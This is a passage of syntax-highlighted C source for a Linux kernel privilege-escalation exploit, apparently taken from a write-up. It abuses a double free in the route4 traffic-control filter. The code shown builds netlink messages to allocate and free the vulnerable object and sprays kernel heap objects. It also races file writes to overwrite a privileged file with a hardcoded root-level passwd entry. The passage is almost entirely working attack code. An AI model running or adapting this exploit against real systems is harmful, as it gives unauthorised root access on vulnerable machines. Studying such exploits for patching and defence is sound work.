.msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    sendmsg(fd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(start);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_tc</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">uint32_t</span> handle, <span class="keyword">uint16_t</span> flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    add_tc_(sockfd, <span class="number">0</span>, handle, (handle &lt;&lt; <span class="number">8</span>) + handle, flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">calc_handle</span><span class="params">(<span class="keyword">uint32_t</span> from, <span class="keyword">uint32_t</span> to)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> handle = to;</span><br><span class="line"></span><br><span class="line">    assert(from &lt;= <span class="number">0xff</span> &amp;&amp; to &lt;= <span class="number">0xff</span>);</span><br><span class="line">    handle |= from &lt;&lt; <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (((handle &amp; <span class="number">0x7f00</span>) | handle) != handle)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (handle == <span class="number">0</span> || (handle &amp; <span class="number">0x8000</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> handle;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">delete_tc_</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">u_int32_t</span> handle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *start = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">msg</span> =</span> (struct nlmsghdr *)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new filter</span></span><br><span class="line">    msg = msg + msg-&gt;nlmsg_len;</span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_ECHO;</span><br><span class="line">    msg-&gt;nlmsg_type = RTM_DELTFILTER;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span> *<span class="title">t</span> =</span> (struct tcmsg *)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_handle = handle;</span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_KIND, <span class="string">&quot;route&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span> *<span class="title">tail</span> =</span> addattr_nest(msg, <span class="number">0x1000</span>, TCA_OPTIONS);</span><br><span class="line">    addattr_nest_end(msg, tail);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// packing</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123;.iov_base = msg, .iov_len = msg-&gt;nlmsg_len&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123;.nl_family = AF_NETLINK&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    sendmsg(sockfd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    iov.iov_len = <span class="number">0x4000</span>;</span><br><span class="line">    iov.iov_base = start;</span><br><span class="line">    recvmsg(sockfd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msgh.msg_namelen != <span class="keyword">sizeof</span>(nladdr))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;size of sender address is wrong\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> start;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_tc</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">uint32_t</span> handle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    delete_tc_(sockfd, ((handle) &lt;&lt; <span class="number">8</span>) + (handle));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// basic for spray</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_tc_basic</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint32_t</span> handle, <span class="keyword">void</span> *spray_data, <span class="keyword">size_t</span> spray_len,</span></span></span><br><span class="line"><span class="params"><span class="function">                 <span class="keyword">int</span> spray_count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    assert(spray_len * spray_count &lt; <span class="number">0x3000</span>);</span><br><span class="line">    <span class="keyword">char</span> *start = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">msg</span> =</span> (struct nlmsghdr *)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new filter</span></span><br><span class="line">    msg = msg + msg-&gt;nlmsg_len;</span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE; <span class="comment">// | flags;</span></span><br><span class="line">    msg-&gt;nlmsg_type = RTM_NEWTFILTER;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span> *<span class="title">t</span> =</span> (struct tcmsg *)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_handle = handle;</span><br><span class="line">    <span class="comment">// t-&gt;tcm_parent = TC_H_ROOT;</span></span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x4000</span>, TCA_KIND, <span class="string">&quot;basic&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span> *<span class="title">tail</span> =</span> addattr_nest(msg, <span class="number">0x4000</span>, TCA_OPTIONS);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span> *<span class="title">ema_tail</span> =</span> addattr_nest(msg, <span class="number">0x4000</span>, TCA_BASIC_EMATCHES);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcf_ematch_tree_hdr</span> <span class="title">tree_hdr</span> =</span> &#123;.nmatches = spray_count / <span class="number">2</span>,</span><br><span class="line">                                           .progid = <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x4000</span>, TCA_EMATCH_TREE_HDR, &amp;tree_hdr, <span class="keyword">sizeof</span>(tree_hdr));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span> *<span class="title">rt_match_tail</span> =</span></span><br><span class="line">        addattr_nest(msg, <span class="number">0x4000</span>, TCA_EMATCH_TREE_LIST);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *data = <span class="built_in">malloc</span>(<span class="number">0x3000</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; tree_hdr.nmatches; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> *current;</span><br><span class="line">        <span class="built_in">memset</span>(data, <span class="number">0</span>, <span class="number">0x3000</span>);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tcf_ematch_hdr</span> *<span class="title">hdr</span> =</span> (struct tcf_ematch_hdr *)data;</span><br><span class="line">        hdr-&gt;kind = TCF_EM_META;</span><br><span class="line">        hdr-&gt;flags = TCF_EM_REL_AND;</span><br><span class="line"></span><br><span class="line">        current = data + <span class="keyword">sizeof</span>(*hdr);</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tcf_meta_hdr</span> <span class="title">meta_hdr</span> =</span> &#123;</span><br><span class="line">            .left.kind = TCF_META_TYPE_VAR &lt;&lt; <span class="number">12</span> | TCF_META_ID_DEV,</span><br><span class="line">            .right.kind = TCF_META_TYPE_VAR &lt;&lt; <span class="number">12</span> | TCF_META_ID_DEV,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        current += addattr(current, TCA_EM_META_HDR, &amp;meta_hdr, <span class="keyword">sizeof</span>(hdr));</span><br><span class="line">        current += addattr(current, TCA_EM_META_LVALUE, spray_data, spray_len);</span><br><span class="line">        current += addattr(current, TCA_EM_META_RVALUE, spray_data, spray_len);</span><br><span class="line"></span><br><span class="line">        addattr_l(msg, <span class="number">0x4000</span>, i + <span class="number">1</span>, data, current - data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    addattr_nest_end(msg, rt_match_tail);</span><br><span class="line">    addattr_nest_end(msg, ema_tail);</span><br><span class="line">    addattr_nest_end(msg, tail);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// packing</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123;.iov_base = msg, .iov_len = msg-&gt;nlmsg_len&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123;.nl_family = AF_NETLINK&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    sendmsg(fd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(data);</span><br><span class="line">    <span class="built_in">free</span>(start);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">delete_tc_basic</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">u_int32_t</span> handle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *start = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">msg</span> =</span> (struct nlmsghdr *)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new filter</span></span><br><span class="line">    msg = msg + msg-&gt;nlmsg_len;</span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_ECHO;</span><br><span class="line">    msg-&gt;nlmsg_type = RTM_DELTFILTER;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span> *<span class="title">t</span> =</span> (struct tcmsg *)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_handle = handle;</span><br><span class="line">    <span class="comment">// t-&gt;tcm_parent = TC_H_ROOT;</span></span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_KIND, <span class="string">&quot;basic&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span> *<span class="title">tail</span> =</span> addattr_nest(msg, <span class="number">0x1000</span>, TCA_OPTIONS);</span><br><span class="line">    addattr_nest_end(msg, tail);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// packing</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123;.iov_base = msg, .iov_len = msg-&gt;nlmsg_len&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123;.nl_family = AF_NETLINK&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    sendmsg(sockfd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    iov.iov_len = <span class="number">0x4000</span>;</span><br><span class="line">    iov.iov_base = start;</span><br><span class="line">    recvmsg(sockfd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msgh.msg_namelen != <span class="keyword">sizeof</span>(nladdr))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;size of sender address is wrong\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> start;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">slow_write</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;start slow write\n&quot;</span>);</span><br><span class="line">    <span class="keyword">clock_t</span> start, end;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;./uaf&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;error open uaf file&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> addr = <span class="number">0x30000000</span>;</span><br><span class="line">    <span class="keyword">int</span> offset;</span><br><span class="line">    <span class="keyword">for</span> (offset = <span class="number">0</span>; offset &lt; <span class="number">0x80000</span> / <span class="number">20</span>; offset++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">void</span> *r = mmap((<span class="keyword">void</span> *)(addr + offset * <span class="number">0x1000</span>), <span class="number">0x1000</span>,</span><br><span class="line">                       PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (r &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;allocate failed at 0x%x\n&quot;</span>, offset);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    assert(offset &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *mem = (<span class="keyword">void</span> *)(addr);</span><br><span class="line">    <span class="built_in">memcpy</span>(mem, <span class="string">&quot;hhhhh&quot;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>[20];</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        iov[i].iov_base = mem;</span><br><span class="line">        iov[i].iov_len = offset * <span class="number">0x1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    run_write = <span class="number">1</span>;</span><br><span class="line">    start = clock();</span><br><span class="line">    <span class="comment">// 2GB max</span></span><br><span class="line">    <span class="keyword">if</span> (writev(fd, iov, <span class="number">20</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;slow write&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    end = clock();</span><br><span class="line">    <span class="keyword">double</span> spent = (<span class="keyword">double</span>)(end - start) / CLOCKS_PER_SEC;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;write done, spent %f s\n&quot;</span>, spent);</span><br><span class="line">    run_write = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">write_cmd</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:/root/root:/bin/bash</span></span><br><span class="line">    <span class="keyword">char</span> data[<span class="number">1024</span>] =</span><br><span class="line">        <span class="string">&quot;user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:/root/root:/bin/bash&quot;</span>;</span><br><span class="line">    <span class="comment">// struct iovec iov = &#123;.iov_base = data, .iov_len = strlen(data)&#125;;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123;.iov_base = content, .iov_len = <span class="built_in">strlen</span>(content)&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!run_write)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    run_spray = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (writev(overlap_a, &amp;iov, <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to write\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;should be after the slow write\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pre_exploit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    adjust_rlimit();</span><br><span class="line">    use_temporary_dir();</span><br><span class="line">    setup_namespace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exploit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">2</span> * PAGE_SIZE] = &#123;&#125;;</span><br><span class="line">    <span class="keyword">char</span> msg[<span class="number">0x10</span>] = &#123;&#125;;</span><br><span class="line">    <span class="keyword">char</span> *spray;</span><br><span class="line">    <span class="keyword">int</span> cc;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">old_lim</span>, <span class="title">lim</span>, <span class="title">new_lim</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get old limits</span></span><br><span class="line">    <span class="keyword">if</span> (getrlimit(RLIMIT_NOFILE, &amp;old_lim) == <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Old limits -&gt; soft limit= %ld \t&quot;</span></span><br><span class="line">               <span class="string">&quot; hard limit= %ld \n&quot;</span>,</span><br><span class="line">               old_lim.rlim_cur, old_lim.rlim_max);</span><br><span class="line">    pin_on_cpu(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;starting exploit, num of cores: %d\n&quot;</span>, cpu_cores);</span><br><span class="line"></span><br><span class="line">    sockfd = socket(PF_NETLINK, SOCK_RAW, <span class="number">0</span>);</span><br><span class="line">    assert(sockfd != <span class="number">-1</span>);</span><br><span class="line">    add_qdisc(sockfd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait for parent</span></span><br><span class="line">    <span class="keyword">if</span> (read(pipe_child[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;read from parent&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// allocate the vulnerable object</span></span><br><span class="line">    add_tc_(sockfd, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, NLM_F_EXCL | NLM_F_CREATE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ask parent to keep spraying</span></span><br><span class="line">    <span class="keyword">if</span> (write(pipe_parent[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;write to child&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (read(pipe_child[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;read from parent&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free the object, to free the slab</span></span><br><span class="line">    add_tc_(sockfd, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0</span>, NLM_F_CREATE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait for the vulnerable object being freed</span></span><br><span class="line">    usleep(<span class="number">500</span> * <span class="number">1000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;freed the filter object\n&quot;</span>);</span><br><span class="line">    <span class="comment">// sync</span></span><br><span class="line">    <span class="keyword">if</span> (write(pipe_parent[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;write to child&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (read(pipe_child[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;read from parent&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    usleep(<span class="number">1000</span> * <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num_1; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pin_on_cpu(i % cpu_cores);</span><br><span class="line">        fds[i] = open(<span class="string">&quot;./data2&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        assert(fds[i] &gt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// double free route4, which will free the file</span></span><br><span class="line">    add_tc_(sockfd, <span class="number">0x11</span>, <span class="number">0x13</span>, <span class="number">0</span>, NLM_F_CREATE);</span><br><span class="line">    usleep(<span class="number">1000</span> * <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// should not sleep too long, otherwise file might be claimed by others</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;double free done\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;spraying files\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// the following is to figure out which file is freed</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num_2; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pin_on_cpu(i % cpu_cores);</span><br><span class="line">        fd_2[i] = open(<span class="string">&quot;./uaf&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        assert(fd_2[i] &gt; <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; spray_num_1; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, fds[j], fd_2[i]) ==</span><br><span class="line">                <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;found overlap, id : %d, %d\n&quot;</span>, i, j);</span><br><span class="line">                overlap_a = fds[j];</span><br><span class="line">                overlap_b = fd_2[i];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">pthread_t</span> pid, pid2;</span><br><span class="line">                pthread_create(&amp;pid, <span class="literal">NULL</span>, slow_write, <span class="literal">NULL</span>);</span><br><span class="line">                pthread_create(&amp;pid2, <span class="literal">NULL</span>, write_cmd, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (!run_spray)</span><br><span class="line">                &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                close(overlap_a);</span><br><span class="line">                close(overlap_b);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;closed overlap\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">                usleep(<span class="number">1000</span> * <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">int</span> spray_num = <span class="number">4096</span>;</span><br><span class="line">                write(pipe_file_spray[<span class="number">0</span>][<span class="number">1</span>], &amp;spray_num, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">                <span class="keyword">if</span> (read(pipe_file_spray[<span class="number">1</span>][<span class="number">0</span>], &amp;msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    err(<span class="number">1</span>, <span class="string">&quot;read from file spray&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                overlapped = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (overlapped)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">while</span> (run_write)</span><br><span class="line">    &#123;</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!overlapped)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;no overlap found :(...\n&quot;</span>);</span><br><span class="line">        write(pipe_main[<span class="number">1</span>], <span class="string">&quot;\xff&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> xx = open(target, <span 